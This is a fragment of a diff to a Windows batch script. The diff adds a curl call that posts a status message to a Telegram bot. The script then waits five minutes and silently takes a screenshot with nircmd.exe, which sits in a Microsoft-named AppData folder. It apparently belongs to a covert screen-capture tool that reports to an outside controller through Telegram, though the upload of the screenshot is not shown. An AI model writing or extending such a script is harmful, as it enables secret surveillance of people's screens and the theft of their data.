@@ -9,6 +9,11 @@ set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
+:: Send the message using curl
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
+     -d "chat_id=%CHAT_ID%" ^
+     -d "text=WAITING5MIN"
+
 timeout /t 300 /nobreak
 
 "%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
